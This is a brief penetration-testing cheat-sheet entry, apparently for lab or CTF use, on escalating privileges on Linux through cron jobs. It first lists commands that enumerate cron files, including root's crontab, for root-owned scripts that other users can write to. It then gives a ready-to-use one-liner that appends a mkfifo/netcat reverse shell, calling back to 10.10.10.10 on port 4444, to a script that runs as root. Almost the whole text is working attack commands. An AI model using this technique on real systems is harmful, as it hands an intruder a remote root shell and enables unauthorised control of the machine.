# Cronjob

## Overview

* with privileges running script that are editable for other users
* look for anything that is owned by privileged user but writable for you

```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

## One Liner to Place into Root Priv'd Cronjob Script for Shell

```bash
# must be able to write to a script that runs as root 
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f" >> script.sh
```
